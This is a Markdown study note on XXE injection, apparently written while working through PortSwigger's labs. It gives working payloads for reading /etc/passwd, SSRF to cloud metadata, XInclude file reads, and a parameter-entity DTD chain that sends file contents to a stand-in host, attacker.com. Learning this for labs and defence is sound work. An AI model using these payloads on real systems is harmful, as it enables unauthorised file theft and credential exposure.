---
tags: [hacking, web, portswigger, xxe]
type: vulnerability-category
source: https://portswigger.net/web-security/xxe
last-verified: 2026-08-25
---

# XXE injection

## Up
- [[PortSwigger]]

## What it is
XML external entity (XXE) injection abuses an app that parses XML. XML supports **entities** defined in a DTD; an *external* entity (via the `SYSTEM` keyword) loads content from a file or URL. If the parser resolves attacker-defined external entities, you can read files, perform SSRF, and exfiltrate data.

## Retrieving files
Define an external entity pointing at a local file and reference it where the response echoes a value:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
The response includes the file's contents.

## SSRF via XXE
Point the entity at an internal URL:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```

## Blind XXE
When the value isn't reflected:
- **Out-of-band** — make the parser call your server:
  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/"> ]>
  ```
  For exfiltration, host a **malicious external DTD** using *parameter entities* to read a file and append it to a request to your server:
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval; %exfil;
  ```
  triggered from the target with `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>`.
- **Via error messages** — force the parser to include file contents in an error, e.g. by referencing a non-existent file whose path is built from `%file;`.

## Hidden attack surface
- **XInclude** — when you can't control the whole document but can inject into a value the server puts into XML:
  ```xml
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </foo>
  ```
- **File upload** — upload an SVG (or DOCX/other XML-based format) containing an XXE payload.
- **Content-Type switch** — change a request body from `application/x-www-form-urlencoded` to `text/xml` and send XML; the endpoint may still parse it.

## Prevention
- Disable resolution of **external entities** and disable **XInclude** in the XML parser (configuration/API varies by library). This is the single most important defense.

## Labs
9 labs. Verify exact titles against the live page.

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| Exploiting XXE using external entities to retrieve files | Apprentice | `file:///etc/passwd` entity in `productId`. | |
| Exploiting XXE to perform SSRF attacks | Apprentice | Entity → cloud metadata URL. | |
| Blind XXE with out-of-band interaction | Practitioner | Entity → Collaborator URL; confirm DNS/HTTP hit. | |
| Blind XXE with out-of-band interaction via XML parameter entities | Practitioner | Use `%`-parameter entity when normal entities are blocked. | |
| Exploiting blind XXE to exfiltrate data using a malicious external DTD | Practitioner | Host an external DTD that reads a file and exfils via URL. | |
| Exploiting blind XXE to retrieve data via error messages | Practitioner | External DTD that forces a parse error containing the file. | |
| Exploiting XInclude to retrieve files | Practitioner | Inject an `xi:include` into a server-built XML value. | |
| Exploiting XXE via image file upload | Practitioner | Upload an SVG with an XXE payload; read it back. | |
| Exploiting XXE to retrieve data by repurposing a local DTD | Expert | Redefine an entity from an existing local DTD to trigger an error leak. | |
